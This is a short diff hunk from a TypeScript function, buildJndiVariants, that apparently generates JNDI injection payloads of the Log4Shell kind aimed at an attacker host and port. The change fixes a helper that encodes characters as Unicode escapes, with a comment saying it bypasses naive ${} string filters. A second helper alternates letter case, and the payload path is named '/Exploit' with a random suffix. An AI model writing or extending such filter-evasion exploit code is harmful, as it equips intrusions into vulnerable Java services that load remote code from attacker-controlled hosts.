@@ -2341,7 +2341,7 @@ export function buildJndiVariants(attackerHost: string, attackerPort: string | n
   const path = `/Exploit${rid()}`;
 
   /* Unicode escapes that bypass naive ${} string filter */
-  const uc = (s: string): string => [...s].map(c => `\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("");
+  const uc = (s: string): string => [...s].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("");
   const lo = (s: string): string => s.split("").map((c,i) => i%2===0?c.toUpperCase():c).join("");
 
   const base: string[] = [
